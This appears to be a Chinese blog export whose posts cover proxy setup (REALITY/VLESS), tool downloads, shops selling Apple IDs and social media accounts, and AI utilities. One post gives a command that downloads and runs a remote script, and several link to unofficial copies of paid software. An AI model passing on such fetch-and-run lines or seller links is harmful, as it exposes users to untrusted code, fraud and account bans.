<h1 id="3、复制链接"><a href="#3、复制链接" class="headerlink" title="3、复制链接"></a>3、复制链接</h1><p><img src="/img/xui/2.webp" alt="tslb43-0"></p>
<h1 id="比较推荐的节点组合："><a href="#比较推荐的节点组合：" class="headerlink" title="比较推荐的节点组合："></a>比较推荐的节点组合：</h1><p>Vless+reality+xtls-rprx-vision<br>Vless+tls+xtls-rprx-vision<br>Vmess+tls+ws(CDN)<br>Vmess+tls+grpc<br>Trojan+tls+grpc<br>个人首推使用xtls-rprx-vision的组合</p>
<h1 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h1><p>使用xtls-rprx-vision流控需要xray core版本为1.7.5及以上<br>使用reality需要xray core版本为1.8.0及以上<br>使用xtls-rprx-vision消除tls in tls特征,但只支持tcp，延迟较高;使用grpc只是缓解tls in tls,但延迟低,体验较好;Reality作用则是消除服务端指纹特征,使用reality时推荐端口为443且回落至Nginx<br>使用reality时目标网站默认为<a href="http://www.microsoft.com,你也可以自行更换;在配置可选域名时请使用英文逗号进行分隔;如何选择合适的目标网站呢,核心在于支持tls/">www.microsoft.com,你也可以自行更换;在配置可选域名时请使用英文逗号进行分隔;如何选择合适的目标网站呢，核心在于支持tls</a> 1.3与h2,这里可以使用RealiTLScanner来获取合适的目标网站<br>当前分享链接中不包含具体的shortId，服务端配置支持客户端不填写shortId;如需要区分具体的客户端，可从服务端的shortIds中选择一个配置到客户端<br>关于REALITY的更多使用信息，可以参考官方repo</p>
<p>当前最新版本已支持VMess、Vless、Trojan的单端口多用户，为了避免滥用，限定每个端口最多为10个用户<br>每个用户拥有自己独立UUID&#x2F;PassWord与email，添加用户时会自动生成默认值，可以自行修改</p>
<p>Reality不支持CDN</p>
<h1 id="支持reality的客户端"><a href="#支持reality的客户端" class="headerlink" title="支持reality的客户端"></a>支持reality的客户端</h1><p>截至到2023&#x2F;4&#x2F;17，支持reality的客户端，如下：</p>
<p>Windows<br><a href="https://github.com/2dust/v2rayN/releases">https://github.com/2dust/v2rayN/releases</a><br><a href="https://github.com/MatsuriDayo/nekoray/releases">https://github.com/MatsuriDayo/nekoray/releases</a><br><a href="https://github.com/2dust/clashN/releases">https://github.com/2dust/clashN/releases</a></p>
<p>Android<br><a href="https://github.com/2dust/v2rayNG/releases">https://github.com/2dust/v2rayNG/releases</a><br><a href="https://github.com/MatsuriDayo/NekoBoxForAndroid/releases">https://github.com/MatsuriDayo/NekoBoxForAndroid/releases</a><br><a href="https://github.com/MetaCubeX/ClashMetaForAndroid">https://github.com/MetaCubeX/ClashMetaForAndroid</a></p>
<p>iOS<br><a href="https://apps.apple.com/app/wings-x/id6446119727">https://apps.apple.com/app/wings-x/id6446119727</a><br><a href="https://sing-box.sagernet.org/installation/clients/sfi/">https://sing-box.sagernet.org/installation/clients/sfi/</a><br><a href="https://t.me/meta_for_ios">https://t.me/meta_for_ios</a></p>
<p>macOS<br><a href="https://github.com/tzmax/V2RayXS/releases">https://github.com/tzmax/V2RayXS/releases</a><br><a href="https://github.com/MetaCubeX/ClashX.Meta">https://github.com/MetaCubeX/ClashX.Meta</a><br>Linux&#x2F;Mac OS&#x2F;Windows<br><a href="https://github.com/zzzgydi/clash-verge">https://github.com/zzzgydi/clash-verge</a></p>
<p>openwrt<br>passwall等软件升级最新版，xray升级到1.8.0以后是支持的。</p>
<p><a href="https://github.com/xiaorouji/openwrt-passwall">https://github.com/xiaorouji/openwrt-passwall</a><br><a href="https://github.com/xiaorouji/openwrt-passwall2">https://github.com/xiaorouji/openwrt-passwall2</a><br><a href="https://github.com/fw876/helloworld">https://github.com/fw876/helloworld</a><br><a href="https://github.com/yichya/openwrt-xray">https://github.com/yichya/openwrt-xray</a><br><a href="https://github.com/yichya/luci-app-xray">https://github.com/yichya/luci-app-xray</a><br><a href="https://github.com/vernesong/OpenClash">https://github.com/vernesong/OpenClash</a><br><a href="https://t.me/merlinclashcat">https://t.me/merlinclashcat</a><br><a href="https://github.com/juewuy/ShellClash">https://github.com/juewuy/ShellClash</a><br><a href="https://t.me/e58695/59">https://t.me/e58695/59</a><br><a href="https://t.me/MagiskChangeKing/126">https://t.me/MagiskChangeKing/126</a></p>
<h1 id="域名推荐"><a href="#域名推荐" class="headerlink" title="域名推荐"></a>域名推荐</h1><p>gateway.icloud.com<br>itunes.apple.com<br>download-installer.cdn.mozilla.net<br>airbnb【这个不同的区有不同的域名建议自己搜索】<br>addons.mozilla.org<br><a href="http://www.microsoft.com/">www.microsoft.com</a><br><a href="http://www.lovelive-anime.jp/">www.lovelive-anime.jp</a><br><a href="http://www.speedtest.net/">www.speedtest.net</a><br><a href="http://www.speedtest.org/">www.speedtest.org</a></p>
<h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><p>Apple:<br>swdist.apple.com<br>swcdn.apple.com<br>updates.cdn-apple.com<br>mensura.cdn-apple.com<br>osxapps.itunes.apple.com<br>aod.itunes.apple.com</p>
<p>Microsoft:<br>cdn-dynmedia-1.microsoft.com<br>update.microsoft<br>software.download.prss.microsoft.com</p>
<p>Amazon:<br>s0.awsstatic.com<br>d1.awsstatic.com<br>images-na.ssl-images-amazon.com<br>m.media-amazon.com<br>player.live-video.net</p>
<p>Google:<br>dl.google.com<br><a href="http://www.google-analytics.com/">www.google-analytics.com</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>xui</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>xui</tag>
      </tags>
  </entry>
  <entry>
    <title>检测服务器的ip是否支持使用 chatgpt</title>
    <url>/posts/c952dddb/</url>
    <content><![CDATA[<p>OpenAI目前只支持美国、英国等部分国家使用，他们的API同样会对使用者的IP进行检测，如果IP地址不可用，则会拒绝服务。</p>
<p>2023年3月更新！注意⚠️！如果你从不受支持的国家和地区访问了OpenAI的API，有可能会面临封号的风险。</p>
<p>这里分享一个主动检测当前设备所用IP是否能使用ChatGPT的脚本，食用方法如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -Ls https://cdn.jsdelivr.net/gh/missuo/OpenAI-Checker/openai.sh)</span><br></pre></td></tr></table></figure>
<p>开源地址：<a href="https://github.com/missuo/OpenAI-Checker">https://github.com/missuo/OpenAI-Checker</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>chatgpt</category>
      </categories>
      <tags>
        <tag>chatgpt</tag>
        <tag>ai</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowrocket 小火箭在线安装</title>
    <url>/posts/f20d7a08/</url>
    <content><![CDATA[<p>除了共享账号之外，另外介绍一种更加快速的安装方法，不需要美区Apple ID，只要能访问网站即可。</p>
<p>从下列网址中选择一个：</p>
<p>地址1：<a href="https://azhanlang.github.io/shadowrocket/index.html">https://azhanlang.github.io/shadowrocket/index.html</a></p>
<p>地址2：<a href="https://shadowsockshelp.github.io/ios/">https://shadowsockshelp.github.io/ios/</a></p>
<p>地址3：<a href="https://rngrng.com/ios/">https://rngrng.com/ios/</a></p>
<p>在线安装<br>点击在线安装，然后进入安装流程，等待安装完成即可使用，可能部分IOS设备安装后，会出现闪退的问题，大家可以可多尝试几个在线安装包。</p>
<p>或者可以试试共享小火箭账号。</p>
]]></content>
      <tags>
        <tag>proxy</tag>
        <tag>shadowrocket</tag>
      </tags>
  </entry>
  <entry>
    <title>全球区域 apple id，谷歌邮箱，shadowrocket 小火箭兑换码等发卡网站</title>
    <url>/posts/4bc1392f/</url>
    <content><![CDATA[<p>由于中国区 App Store 下架了很大一部分应用，导致中国国内苹果用户想要享受流畅的国际互联网就变得很难。动手能力强的朋友可以选择自己折腾注册海外Apple ID，但验证Apple ID的时候同样需要海外IP环境，如果是首次接触，没有海外IP环境，依然很难。此外，购买付费的非国区App Store中的软件还是有一定操作难度的，如果是从美国苹果官网购买，需要你有Visa 或万事达信用卡。</p>
<p>小火箭Shadowrocket账号</p>
<p>其实最简单的办法就是购买现成的非国区Apple ID账号，包含了小火箭的账号更佳。如果已有非国区Apple ID，也可以直接购买兑换码兑换你想要的App。下面的几个网站可能会有所帮助，建议收藏。</p>
<p>如果发现售价远低于市场价格，则可能是黑卡购买的兑换码，这种情况不建议购买，否则可能账号受到牵连。另外，不建议租用账号，此种行为极不道德，误操作登录 iCloud 后也可能导致手机被锁得不偿失。</p>
<p>小火箭吧<br>外区 Apple ID<br>Shadowrocket、Quantumult X、Stash兑换码<br>已购 Shadowrocket、Quantumult X 成品账号<br><a href="https://xiaohuojian8.com/">https://xiaohuojian8.com/</a></p>
<p>Hanhan 小卖部<br>各地区苹果账号，包含已经购买了小火箭、QX等软件的成品账号<br>Google Voice 虚拟号码<br>各区域 iTunes 礼品卡<br>Telegram 代理<br>机场套餐<br><a href="https://fk.myue.cc/">https://fk.myue.cc/</a></p>
<p>影创科技<br>各地区苹果账号，包含已经购买了小火箭、QX等软件的成品账号<br>Google Voice 虚拟号码<br>各区域 iTunes 礼品卡<br><a href="https://xintaifree.ml/">https://xintaifree.ml</a></p>
<p>ShopMoct<br>美区、韩国、台湾、日本、菲律宾、新加坡 Apple ID<br>Shadowrocket、Quantumult X、Stash兑换码<br>已购 Shadowrocket、Quantumult X 、Stash成品账号<br><a href="https://shop.moct.cloud/">https://shop.moct.cloud/</a></p>
<p>特懒铺<br>美区 Apple ID<br>已购 Shadowrocket、Quantumult X 成品账号<br>Google Voice 虚拟手机号<br><a href="https://zoilr.com/">https://zoilr.com/</a></p>
<p>Booster<br>美区Apple ID<br>小火箭和Choc兑换码<br><a href="https://37apps.net/">https://37apps.net/</a></p>
<p>芒果ID商城<br>各地区苹果账号，包含已经购买了小火箭、QX等软件的成品账号<br>Google Voice 账号<br>ChatGPT 账号<br>TikTok 账号<br><a href="https://www.mgidmall.com/">https://www.mgidmall.com/</a></p>
<p>我要ID网<br>美区苹果账号，包含已经购买了小火箭的成品账号<br>Google Voice 虚拟号码<br>Facebook 脸书账号<br>Twitter 推特账号<br>Telegram 电报账号<br>Instagram 账号<br>Tiktok 账号<br><a href="https://51id.net/">https://51id.net/</a></p>
<p>火箭妹<br>各地区苹果账号，包含已经购买了小火箭、QX等软件的成品账号<br>Google Voice 虚拟号码<br>各区域 iTunes 礼品卡<br><a href="https://www.rocketgirls.space/product/">https://www.rocketgirls.space/product/</a></p>
<p>AZ200 发卡<br>已经购买了小火箭、QX等软件的成品账号<br><a href="https://www.az200.icu/">https://www.az200.icu/</a></p>
<p>叶の馆<br>小火箭、QX 兑换码<br>iTunes 礼品卡<br>各地区苹果账号<br><a href="https://tsubakitokanako.com/product/">https://tsubakitokanako.com/product/</a></p>
<p>IDC 123<br>非国区Apple ID<br>小火箭、QX兑换码<br>VPS及其他<br><a href="https://www.idc123.xyz/index.php/store/mac">https://www.idc123.xyz/index.php/store/mac</a></p>
<p>杂货铺<br>各地区Apple ID，含成品账号<br>Hostloc 邀请码<br>草榴社区邀请码<br>Office 365 全平台 帐号<br><a href="https://zahuo.info/">https://zahuo.info/</a></p>
<p>在花商店<br>各地区Apple ID，含成品账号<br>小火箭、Quantumult X 兑换码<br>Google Voice 账号<br>电脑软件兑换码<br><a href="https://www.appleidd.com/">https://www.appleidd.com/</a></p>
<p>数字商店<br>各地区Apple ID<br>Gmail 账号<br>Google Voice 账号<br><a href="https://345456.xyz/product/">https://345456.xyz/product/</a></p>
<p>羊王杂货铺<br>各地区Apple ID，含成品账号<br>小火箭、Quantumult X 兑换码<br>Google Voice 账号<br><a href="https://id.521314888.xyz/product/">https://id.521314888.xyz/product/</a></p>
<p>App兑换码专卖店<br>各地区Apple ID，含成品账号<br>小火箭、Quantumult X 兑换码<br><a href="https://appdhm.com/">https://appdhm.com/</a></p>
<p>365yzz shop<br>各地区Apple ID，含成品账号<br>小火箭兑换码<br>Netflix 合租<br><a href="https://nf.365yzz.cn/">https://nf.365yzz.cn/</a></p>
<p>Leouu<br>美区Apple ID 3美元、10美元兑换码<br>Netflix 账号<br>更多其它<br><a href="https://shop.leouu.cn/">https://shop.leouu.cn/</a></p>
<p>EV小卖部<br>美区小火箭账号<br>美区、港区Apple ID<br><a href="https://fk.evvcv.com/">https://fk.evvcv.com</a></p>
<p>数卡杂货铺<br>美区小火箭账号<br>美区 Apple ID<br><a href="https://store.kxsw.org/">https://store.kxsw.org/</a></p>
<p>桃子商店<br>美区、港区 Apple ID<br>Shadowrocket、Quantumult X、Stash兑换码<br>已购 Shadowrocket 美区成品账号<br>苹果礼品卡、Google Play 礼品卡<br>Google Voice 号码<br>其他软件<br><a href="https://shop.tz.ci/">https://shop.tz.ci/</a></p>
<p>王先生的店铺<br>美国、韩国、台湾、日本、英国、马来西亚 Apple ID<br>Shadowrocket、Quantumult X、Stash兑换码<br>已购 Shadowrocket、Quantumult X 、Stash成品账号<br><a href="https://www.wxsdg.store/">https://www.wxsdg.store/</a></p>
<p>YattaZen杂货铺<br>Shadowrocket、Quantumult X、Stash兑换码<br>美区 iTunes 礼品卡<br><a href="https://store.yattazen.com/">https://store.yattazen.com/</a></p>
<p>中州西鹿Store<br>美国、韩国、日本、 Apple ID<br>已购 Shadowrocket、Quantumult X 成品账号<br>Google Play 账号、Twitter、TG账号<br><a href="https://shop.gmail12356.top/">https://shop.gmail12356.top/</a></p>
<p>id应用商店<br><a href="https://idappstore.cc/">https://idappstore.cc/</a></p>
<p>CNBoy Store<br><a href="https://shop.cnboy.org/">https://shop.cnboy.org/</a></p>
<p>自助购卡商城<br><a href="https://appsir.top/">https://appsir.top/</a></p>
<p>肥鸡鸡-海外<br><a href="https://www.feijiji.com/">https://www.feijiji.com/</a></p>
<p>环球巴士<br><a href="https://universalbus.cn/">https://universalbus.cn/</a></p>
<p>林奈奈小铺<br><a href="https://www.linnainai.xyz/">https://www.linnainai.xyz/</a></p>
<p><a href="https://aunlock.laogoubi.net/s/b06c4975ea3cd40f376298da9a3b14b8">小火箭共享账号,小火箭账号,小火箭下载 (laogoubi.net)</a></p>
<p>如果你还有更多网站推荐，可以直接在评论区留言。</p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>shadowrocket</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>shadowrocket</tag>
      </tags>
  </entry>
  <entry>
    <title>video subtitle extractor (vse) 将视频中的硬字幕提取为外挂字幕文件(srt格式)</title>
    <url>/posts/7c62a1b4/</url>
    <content><![CDATA[<p>Video-subtitle-extractor (vse) 是一款将视频中的硬字幕提取为外挂字幕文件(srt格式)的软件。 主要实现了以下功能：</p>
<p>提取视频中的关键帧<br>检测视频帧中文本的所在位置<br>识别视频帧中文本的内容<br>过滤非字幕区域的文本，去除水印（台标）文本<br>去除重复字幕行，生成srt字幕文件<br>支持视频字幕批量提取（打开文件的时候选择多个视频）<br>多语言：支持中文&#x2F;英文、日语、韩语、阿拉伯语、繁体中文、法语、德语、俄语、西班牙语、葡萄牙语、意大利语字幕的提取<br>多模式：<br>快速 - 快速提取字幕但可能丢字幕（推荐）<br>精准 - 不丢字幕但速度较慢</p>
<p>下载地址：</p>
<p>Windows 单文件版本： vse.exe 提取码：17uj<br>(双击直接运行，每次打开时会有一点慢，推荐小白使用)</p>
<p>Windows GPU版本：<a href="https://pan.baidu.com/s/1L-cdVHnBGva2bGrsStYnnQ"> vse_windows_GPU.7z</a> 提取码：r911</p>
<p>Windows CPU版本：<a href="https://pan.baidu.com/s/1oPyJowF0XgHtgg2g9EA-nw">vse_windows_CPU.zip</a> 提取码：1vi6</p>
<p>MacOS CPU版本：<a href="https://pan.baidu.com/s/1WgZpr_8I3Dv7A8ThwcIPng">vse_macOS_CPU.dmg</a> 提取码：7gbo</p>
<p>PS: 若无法下载，请前往 Release 下载<br><a href="https://github.com/YaoFANGUK/video-subtitle-extractor/releases/tag/1.0.0">https://github.com/YaoFANGUK/video-subtitle-extractor/releases/tag/1.0.0</a></p>
]]></content>
      <categories>
        <category>ai</category>
        <category>vse</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>vse</tag>
      </tags>
  </entry>
  <entry>
    <title>好用的 apk 下载网站，完美替代 google play</title>
    <url>/posts/30d4cfbf/</url>
    <content><![CDATA[<p>如果不想从国内的安卓商店安装软件或者你想要安装的软件无法上架中国区商店，可以使用科学上网的办法，使用安卓官方应用商店 Google Play，但如果没有办法进行科学上网或者无法安装GMS导致无法使用Google Play ，这里有可以完美替代Google Play 的网站或App。</p>
<p>替代谷歌Play 第三方安卓APK下载商店推荐<br>APKPure<br>提供：网页、App<br>网址：<a href="https://apkpure.com/cn/">https://apkpure.com/cn/</a></p>
<p>APKPure 是知名度很高的免费安卓应用商店，基本上大部分Google Play上架的软件都可以在这里找到。</p>
<p>Aurora Store<br>提供：App<br>网址：<a href="https://aurora-store.cn.uptodown.com/android">https://aurora-store.cn.uptodown.com/android</a></p>
<p>Aurora Store也是一个完全免费且开源的应用商店，而且兼容原生安卓，不需要GMS也能完美安装及使用。</p>
<p>Aptoide<br>提供：网页版、App<br>网址：<a href="https://en.aptoide.com/">https://en.aptoide.com/</a></p>
<p>APK Combo<br>提供：网页版<br>网址：<a href="https://apkcombo.com/zh/">https://apkcombo.com/zh/</a></p>
<p>apkdl.in<br>提供：网页版、机器人<br>网址：<a href="https://apkdl.in/">https://apkdl.in/</a><br>bot：@apkdl_bot</p>
<p>APKMirror<br>提供：网页版</p>
<p>网址：<a href="https://www.apkmirror.com/">https://www.apkmirror.com/</a></p>
<p>APKMirror商店很多国内用户也用过，这个就不需要多介绍了，可能是最好的替代Play商店应用之一，不过国内访问速度较慢也是个问题。</p>
<p>9Apps<br>提供：网页版、App<br>网址：<a href="https://www.9apps.com/">https://www.9apps.com/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>adobe photoshop 2023 beta 24.6</title>
    <url>/posts/d2056b4/</url>
    <content><![CDATA[<p>最近推出了全新的Adobe PhotoShop 2023 Beta 24.6测试版本，简称PS，目前测试版内置Ai绘图功能，非常强大大，适合任何图片编辑、设计师们，感兴的同学可以抢先体验，本次提供Windows安装包，并且附录到Adobe PhotoShop 2023 Beta安装步骤，小白也适用。</p>
<p>Adobe PhotoShop 2023 Beta 24.6下载地址<br>链接: <a href="https://pan.baidu.com/s/1tDlTMdmaroivDLBDO4xMSA?pwd=fze2">https://pan.baidu.com/s/1tDlTMdmaroivDLBDO4xMSA?pwd=fze2</a> 提取码: fze2 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>photoshop</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>photoshop</tag>
      </tags>
  </entry>
  <entry>
    <title>go proxy bing 大陆访问 new bing 演示站点，无须科学上网既可访问</title>
    <url>/posts/3b620882/</url>
    <content><![CDATA[<p>go-proxy-bing<br>这款开源程序是基于微软 New Bing 用 Vue3 和 Go 定制的微软 New Bing 演示站点，拥有一致的 UI 体验，支持 ChatGPT 提示词，无需翻墙，国内可用，不再重定向 CN ！兼容微软 Bing AI 几乎所有功能，无需登录即可畅聊。</p>
<h1 id="A-本地部署方式："><a href="#A-本地部署方式：" class="headerlink" title="A.本地部署方式："></a>A.本地部署方式：</h1><h2 id="1-下载-开源项目：go-proxy-bing-【点击下载】-【注意：部分杀毒软件会误报，建议使用后面的方法进行安装】"><a href="#1-下载-开源项目：go-proxy-bing-【点击下载】-【注意：部分杀毒软件会误报，建议使用后面的方法进行安装】" class="headerlink" title="1.下载 开源项目：go-proxy-bing 【点击下载】- 【注意：部分杀毒软件会误报，建议使用后面的方法进行安装】"></a>1.下载 开源项目：go-proxy-bing 【<a href="https://github.com/adams549659584/go-proxy-bingai/releases/tag/v1.8.7">点击下载</a>】- 【注意：部分杀毒软件会误报，建议使用后面的方法进行安装】</h2><h2 id="2-Cloudflare-免费部署聊天服务器"><a href="#2-Cloudflare-免费部署聊天服务器" class="headerlink" title="2.Cloudflare 免费部署聊天服务器"></a>2.Cloudflare 免费部署聊天服务器</h2><p>注册 <a href="https://dash.cloudflare.com/sign-up">Cloudflare</a> 账号<br>核心代码 <a href="https://github.com/adams549659584/go-proxy-bingai/blob/master/cloudflare/worker.js">worker.js</a><br>创建 Worker 服务，复制 <a href="https://github.com/adams549659584/go-proxy-bingai/blob/master/cloudflare/worker.js">worker.js</a> 全部代码，粘贴至创建的服务中，保存并部署。<br>触发器 中自定义访问域名或者使用默认的</p>
<h1 id="B-部署方式：免费容器一键部署！"><a href="#B-部署方式：免费容器一键部署！" class="headerlink" title="B.部署方式：免费容器一键部署！"></a>B.部署方式：免费容器一键部署！</h1><h2 id="1-Railway"><a href="#1-Railway" class="headerlink" title="1.Railway"></a>1.Railway</h2><p>一键部署，点这里 &#x3D;&gt; <a href="https://railway.app/template/uIckWS?referralCode=BBs747">Deploy on Railway</a><br>路径：docker&#x2F;Dockerfile<br>端口：8080</p>
<h2 id="2-Render-（推荐大陆用户使用，100-免翻墙）"><a href="#2-Render-（推荐大陆用户使用，100-免翻墙）" class="headerlink" title="2.Render （推荐大陆用户使用，100%免翻墙）"></a>2.Render （推荐大陆用户使用，100%免翻墙）</h2><p>一键部署，点这里 &#x3D;&gt; <a href="https://render.com/deploy?repo=https://github.com/adams549659584/go-proxy-bingai">Deploy to Render</a></p>
<h2 id="3-VPS-（Docker）一键部署"><a href="#3-VPS-（Docker）一键部署" class="headerlink" title="3.VPS  （Docker）一键部署"></a>3.VPS  （Docker）一键部署</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:8080 --name go-proxy-bingai --restart=unless-stopped adams549659584/go-proxy-bingai</span><br></pre></td></tr></table></figure>
<p>然后利用 caddy 反代 （以Debian系统为例）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https</span><br><span class="line">curl -1sLf <span class="string">&#x27;https://dl.cloudsmith.io/public/caddy/stable/gpg.key&#x27;</span> | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg</span><br><span class="line">curl -1sLf <span class="string">&#x27;https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt&#x27;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/caddy-stable.list</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install caddy</span><br></pre></td></tr></table></figure>
<p>编辑配置文件 &#x2F;etc&#x2F;caddy&#x2F;Caddyfile</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxxx.com</span><br><span class="line">encode gzip</span><br><span class="line">reverse_proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<p>重启caddy</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart caddys</span><br></pre></td></tr></table></figure>
<p>最后访问你绑定域名即可</p>
]]></content>
      <categories>
        <category>ai</category>
        <category>newbing</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>newbing</tag>
      </tags>
  </entry>
  <entry>
    <title>ms-tts / edge-tts 免费文本转语音</title>
    <url>/posts/75671479/</url>
    <content><![CDATA[<p>MS-TTS使用的是微软Azure文本转语音演示DEMO页面接口，每次合成内容有长度限制以及合成频率限制，长度限制你们不用管，由软件自动分段切割，合成频率这块软件基本已经调整到了最高上限，千万不要自作聪明多开，免得搞一晚上到最后一个都合成不了还跑来问为什么。</p>
<p>Edge-TTS使用的是edge浏览器大声朗读接口，合成条件相对较宽松，但不支持对语言角色进行深度调整，对语音角色没有特别强的定制需求推荐使用Edge-TTS，接口稳定，合成速度快。</p>
<p>现版本MS-TTS每天需要在网站登录购买MS-TTS扣分专用资源方可使用，不是让你们买右边这个，求你们睁大眼睛看看清楚！！！扣分专用资源价格为0.2积分，每天登录后在用户中心签到可免费获取0.4积分，足够每天使用MS-TTS</p>
<p>MS-TTS 扣分专用<br><a href="https://ztjun.fun/64.html">https://ztjun.fun/64.html</a></p>
<p>下载链接<br><a href="https://www.123pan.com/s/zuYeVv-ngKbd.html">https://www.123pan.com/s/zuYeVv-ngKbd.html</a> 提取码:xkLt</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>tts</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>tts</tag>
      </tags>
  </entry>
  <entry>
    <title>deepl pro v2.4.0 ai 翻译神器</title>
    <url>/posts/558cf6fa/</url>
    <content><![CDATA[<p>软件介绍<br>DeepL Pro是一家起源于德国的 AI 创业公司，这个领域竞争相当激烈。据不少外媒报道，DeepL翻译效果碾压谷歌和微软。支持中文、英语、德语、法语、日语、西班牙语、意大利语、荷兰语及波兰语之间的全文翻译。</p>
<p><a href="https://www.123pan.com/s/zuYeVv-OYKbd.html">https://www.123pan.com/s/zuYeVv-OYKbd.html</a> 提取码:fVA0</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>ai</category>
        <category>deepl</category>
        <category>translate</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>ai</tag>
        <tag>deepl</tag>
      </tags>
  </entry>
  <entry>
    <title>so vits svc 用人工智能 ai 翻唱歌曲</title>
    <url>/posts/921109e3/</url>
    <content><![CDATA[<h1 id="1-So-VITS-SVC-最新一键安装包下载"><a href="#1-So-VITS-SVC-最新一键安装包下载" class="headerlink" title="1. So-VITS-SVC 最新一键安装包下载"></a>1. So-VITS-SVC 最新一键安装包下载</h1><p>网盘网盘：链接: <a href="https://pan.baidu.com/s/1TDL0XEcG-8mtRP2LgiKSJA?pwd=xvaq">https://pan.baidu.com/s/1TDL0XEcG-8mtRP2LgiKSJA?pwd=xvaq</a> 提取码: xvaq 复制这段内容后打开百度网盘手机App，操作更方便哦</p>
<p><a href="https://github.com/svc-develop-team/so-vits-svc">GitHub 开源</a></p>
<h1 id="2-下载后先安装-UVR5-，并加载压缩包里的模型，放入-models，然后进行人声分离，去除和声和混响；"><a href="#2-下载后先安装-UVR5-，并加载压缩包里的模型，放入-models，然后进行人声分离，去除和声和混响；" class="headerlink" title="2.下载后先安装 UVR5 ，并加载压缩包里的模型，放入 models，然后进行人声分离，去除和声和混响；"></a>2.下载后先安装 UVR5 ，并加载压缩包里的模型，放入 models，然后进行人声分离，去除和声和混响；</h1><p><img src="/img/svc/1.webp" alt="2023-06-09-163727-707x720"></p>
<h1 id="3-准备自己干净的人声，在安静的环境下录制，最好别低于30分钟，声音文件格式WAV-文件批量重命名工具-链接-https-pan-baidu-com-s-1cI6Lwm-bgbsGI03qt-621Q-pwd-gu2g-提取码-gu2g-复制这段内容后打开百度网盘手机App，操作更方便哦"><a href="#3-准备自己干净的人声，在安静的环境下录制，最好别低于30分钟，声音文件格式WAV-文件批量重命名工具-链接-https-pan-baidu-com-s-1cI6Lwm-bgbsGI03qt-621Q-pwd-gu2g-提取码-gu2g-复制这段内容后打开百度网盘手机App，操作更方便哦" class="headerlink" title="3.准备自己干净的人声，在安静的环境下录制，最好别低于30分钟，声音文件格式WAV 文件批量重命名工具 链接: https://pan.baidu.com/s/1cI6Lwm-bgbsGI03qt-621Q?pwd=gu2g 提取码: gu2g 复制这段内容后打开百度网盘手机App，操作更方便哦"></a>3.准备自己干净的人声，在安静的环境下录制，最好别低于30分钟，声音文件格式WAV 文件批量重命名工具 链接: <a href="https://pan.baidu.com/s/1cI6Lwm-bgbsGI03qt-621Q?pwd=gu2g">https://pan.baidu.com/s/1cI6Lwm-bgbsGI03qt-621Q?pwd=gu2g</a> 提取码: gu2g 复制这段内容后打开百度网盘手机App，操作更方便哦</h1><h1 id="4-Audio-Slicer-进行音频分割切片，每段长度最好别超过7秒，最后把切好的音频文件夹放入-根目录的-dataset-raw-下"><a href="#4-Audio-Slicer-进行音频分割切片，每段长度最好别超过7秒，最后把切好的音频文件夹放入-根目录的-dataset-raw-下" class="headerlink" title="4.Audio Slicer 进行音频分割切片，每段长度最好别超过7秒，最后把切好的音频文件夹放入 根目录的 dataset_raw 下"></a>4.Audio Slicer 进行音频分割切片，每段长度最好别超过7秒，最后把切好的音频文件夹放入 根目录的 dataset_raw 下</h1><h1 id="5-so-vits-svc-文件夹下打开：启动webui-bat-正式开始训练"><a href="#5-so-vits-svc-文件夹下打开：启动webui-bat-正式开始训练" class="headerlink" title="5.so-vits-svc 文件夹下打开：启动webui.bat 正式开始训练"></a>5.so-vits-svc 文件夹下打开：启动webui.bat 正式开始训练</h1><h1 id="6-训练好后打开：启动tensorboard-bat-试听效果-，可以的话就进行最后一步合成！-详见教程操作"><a href="#6-训练好后打开：启动tensorboard-bat-试听效果-，可以的话就进行最后一步合成！-详见教程操作" class="headerlink" title="6.训练好后打开：启动tensorboard.bat 试听效果 ，可以的话就进行最后一步合成！ 详见教程操作"></a>6.训练好后打开：启动tensorboard.bat 试听效果 ，可以的话就进行最后一步合成！ 详见教程操作</h1>]]></content>
      <categories>
        <category>ai</category>
        <category>sovitssvc</category>
      </categories>
      <tags>
        <tag>ai</tag>
        <tag>so vits svc</tag>
      </tags>
  </entry>
  <entry>
    <title>centos 安装 docker</title>
    <url>/posts/1efa1fcf/</url>
    <content><![CDATA[<h1 id="Docker支持以下的CentOS版本："><a href="#Docker支持以下的CentOS版本：" class="headerlink" title="Docker支持以下的CentOS版本："></a>Docker支持以下的CentOS版本：</h1><p>CentOS 7 (64-bit)<br>CentOS 6.5 (64-bit) 或更高的版本<br>前提条件<br>目前，CentOS 仅发行版本中的内核支持 Docker。<br>Docker 运行在 CentOS 7 上，要求系统为64位、系统内核版本为 3.10 以上。<br>Docker 运行在 CentOS-6.5 或更高的版本的 CentOS 上，要求系统为64位、系统内核版本为 2.6.32-431 或者更高版本。</p>
